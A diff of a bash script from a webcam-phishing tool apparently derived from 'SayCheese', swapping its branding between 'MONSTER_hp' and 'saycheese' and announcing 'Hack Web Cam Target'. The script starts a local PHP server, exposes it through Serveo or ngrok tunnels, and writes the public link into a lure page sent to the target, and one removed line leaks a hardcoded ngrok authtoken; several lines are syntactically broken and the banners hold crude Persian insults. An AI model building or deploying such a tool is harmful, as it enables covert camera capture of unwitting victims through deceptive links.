@@ -1,56 +1,23 @@
-print("Hello")
-#_ _  __  ___  _   _ ____ _____ _____ ____      _   _    _    ____ _  __ 
-#|  \/  |/ _ \| \ | / ___|_   _| ____|  _ \    | | | |  / \  / ___| |/ / 
-#| |\/| | | | |  \| \___ \ | | |  _| | |_) |   | |_| | / _ \| |   | ' /  
-#| |  | | |_| | |\  |___) || | | |___|  _ <    |  _  |/ ___ \ |___| . \  
-#|_|  |_|\___/|_| \_|____/ |_| |_____|_| \_\___|_| |_/_/   \_\____|_|\_\ 
-#                                         |_____|                        
-#      >>> GitHub : 
-https://github.com/werwerwwk/poopoo.git
-#        >>> Telegram Chanell : https://t.me/MONSTER_SECURIT <<<
-#          >>> Web Sayte : www.Monster-Security.blogfa.com <<<
-#                         </> MONSTER_hp </>
+#!/bin/bash
+# SayCheese v1.0
+# coded by: https://github.com/werwerwwk/poopoo/tree/main
+# If you use any part from this code, giving me the credits. Read the Lincense!
 
 trap 'printf "\n";stop' 2
-printf "\e[1;92m
 
- ____                      _                 _
-|  _ \  _____      ___ __ | | ___   __ _  __| |___                                      | | | |/ _ \ \ /\ / / '_ \| |/ _ \ / _` |/ _` / __|
-| |_| | (_) \ V  V /| | | | | (_) | (_| | (_| \__ \                                     |____/ \___/ \_/\_/ |_| |_|_|\___/ \__,_|\__,_|___/
-                                                            
-/n"
-printf " \e[1;95m    Download pakege Loading 15 min time \n"
-printf "\n"
-pkg install php -y 
-pkg install openssh -y
-pkg install ssh -y
-pkg install wget -y
-printf "\e[1;90m    \n"
-
-clear
 banner() {
 
+printf "\e[1;92m       ⁪⁬⁮⁮⁮⁮         ⁪⁬⁮⁮⁮⁮   \e[0m\e"
 
-printf "\e[1;92m
- __  __                 _          __        __   _      ____                
-|  \/  | ___  _ __  ___| |_ ___ _ _\ \      / /__| |__  / ___|__ _ _ __ ___  
-| |\/| |/ _ \| '_ \/ __| __/ _ \ '__\ \ /\ / / _ \ '_ \| |   / _  | '_   _ |``
-| |  | | (_) | | | \__ \ ||  __/ |   \ V  V /  __/ |_) | |__| (_| | | | | | |
-|_|  |_|\___/|_| |_|___/\__\___|_|____\_/\_/ \___|_.__/ \____\__,_|_| |_| |_|
-                                |_____|                                      
-/n"
-printf "\e[1;90m    \n"
 
-printf " \e[1;91m          ===> !!! Hack Web Cam Target !!!  <===\n"
-printf " \e[95m\n"
-printf " \e[1;93m GitHub : https://github.com/werwerwwk/poopoo.git
-printf " \e[90m\n"
-printf " \e[1;96m   Telegram Chanell : https://t.me/MONSTER_SECURITY\n"
-printf " \e[90m\n"
-printf " \e[1;95m      WebSayte : WwW.MONSTER-SECURITY.blogfa.com\n"
+printf "\e[1;92m       ⁪⁬⁮⁮⁮⁮         ⁪⁬⁮⁮⁮⁮   \e[0m\e"
+
+printf "\e[1;92m   mamad left bede📸\e[0m\e   \e[0m\n"
+printf "\e[1;92m   cos nanat aski bri hal                               \n"
+
+printf " \e[1;77m v1.0 coded by https://github.com/werwerwwk/poopoo/tree/main\e[0m \n"
+
 printf "\n"
-
-
 
 
 }
@@ -78,7 +45,7 @@ exit 1
 dependencies() {
 
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; }
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 
 
 
@@ -124,7 +91,7 @@ done
 
 server() {
 
-command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; }
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 
 printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
 
@@ -147,7 +114,7 @@ fuser -k 3333/tcp > /dev/null 2>&1
 php -S localhost:3333 > /dev/null 2>&1 &
 sleep 3
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link "https://[0-9a-z]*\.ngrok.io")
+printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
 
 }
 
@@ -155,7 +122,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' MONSTER_hp.html > index2.html
+sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
@@ -167,8 +134,8 @@ ngrok_server() {
 if [[ -e ngrok ]]; then
 echo ""
 else
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting.";}
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; }
+command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
@@ -179,10 +146,9 @@ if [[ -e ngrok-stable-linux-arm.zip ]]; then
 unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
-./ngrok authtoken 1pNPp1Tg0trSteYnDWVVocff6gq_2CVCycNZocXS1n3kDL6ye > /dev/null 2>&1
 else
 printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
-
+exit 1
 fi
 
 else
@@ -193,7 +159,7 @@ chmod +x ngrok
 rm -rf ngrok-stable-linux-386.zip
 else
 printf "\e[1;93m[!] Download error... \e[0m\n"
-
+exit 1
 fi
 fi
 fi
@@ -206,9 +172,8 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:"https://[0-9a-z]*\.ngrok.io"    \e[0m\e[1;77m %s\e[0m\n" $link
 
-sleep 15
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 payload_ngrok
 checkfound
 }
@@ -222,7 +187,7 @@ printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 default_option_server="1"
-read -p $'\n\e1#\e[0m\e1 MONSTER_hp~> \e[0m' option_server
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 if [[ $option_server -eq 1 ]]; then
 
@@ -245,7 +210,7 @@ payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' MONSTER_hp.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
@@ -254,7 +219,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="MONSTER_hp$RANDOM"
+default_subdomain="saycheese$RANDOM"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
